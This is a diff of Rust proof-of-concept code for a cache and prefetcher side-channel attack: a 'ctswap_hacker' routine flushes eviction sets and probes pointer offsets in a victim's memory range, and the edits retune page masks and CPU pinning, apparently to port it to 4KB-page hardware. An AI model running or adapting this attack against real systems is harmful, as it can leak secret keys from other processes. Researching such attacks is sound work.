@@ -64,7 +64,8 @@ fn ctswap_hacker(
     // create flush thread
     let (tx, rx) = mpsc::channel();
     let _handle = thread::spawn(move || {
-        unsafe{ pin_cpu(5); }
+        // unsafe{ pin_cpu(5); }
+        unsafe{ pin_cpu(2); }
         loop {
             unsafe{ flush_evset(flush_ptr_value as *mut u64, (NUM_EVSETS / num_group * L2_CACHE_WAYS) as u32); }
 
@@ -87,7 +88,8 @@ fn ctswap_hacker(
     println!("[+] Flush thread is created!");
     let cevset_now = Instant::now();
     loop {
-        target_ptr_offset = rng.gen::<u64>() & 0x3f80;
+        // target_ptr_offset = rng.gen::<u64>() & 0x3f80;
+        target_ptr_offset = rng.gen::<u64>() & 0xFFF;
         if target_ptr_offset == dst_buf_offset {
             println!("The same as victim array offset!");
             continue;
@@ -447,7 +449,8 @@ fn main() {
     // load dst array page offset
     let dst_buf_offset_str: Vec<String> = read_to_string("ctswap_addr.txt").unwrap().lines().map(String::from).collect();
     let dst_buf_offset = match u64::from_str_radix(&(dst_buf_offset_str[0][2..]), 16) {
-        Ok(result) => result & 0x3f80,
+        // Ok(result) => result & 0x3f80,
+        Ok(result) => result & 0xFFF,
         Err(error) => panic!("Fail to parse memory boundary {}", error)
     };
 
@@ -455,11 +458,13 @@ fn main() {
     let dyld_space_str: Vec<String> = read_to_string("dyld_space.txt").unwrap().lines().map(String::from).collect();
     println!("[+] Grab dyld search space from file...");
     let victim_cl_start = match u64::from_str_radix(&(dyld_space_str[0][2..]), 16) {
-        Ok(result) => result & 0xffffffffffffc000,
+        // Ok(result) => result & 0xffffffffffffc000,
+        Ok(result) => result & 0xfffffffffffff000 ,
         Err(error) => panic!("Fail to parse memory boundary {}", error)
     };
     let victim_cl_end = match u64::from_str_radix(&(dyld_space_str[1][2..]), 16) {
-        Ok(result) => result & 0xffffffffffffc000,
+        // Ok(result) => result & 0xffffffffffffc000,
+        Ok(result) => result & 0xfffffffffffff000 ,
         Err(error) => panic!("Fail to parse memory boundary {}", error)
     };
 
@@ -467,7 +472,8 @@ fn main() {
     println!("[+] Target Pointer start frame -> {:#x}", victim_cl_start);
     println!("[+] Target Pointer end frame -> {:#x}", victim_cl_end);
 
-    unsafe{ pin_cpu(4); }
+    // unsafe{ pin_cpu(4); }
+    unsafe{ pin_cpu(1); }
 
     // Allocate Precise Flush buffer
     let size_of_flush_buf: usize = size_of::<u64>() * (NUM_EVSETS/num_group) * L2_CACHE_WAYS;
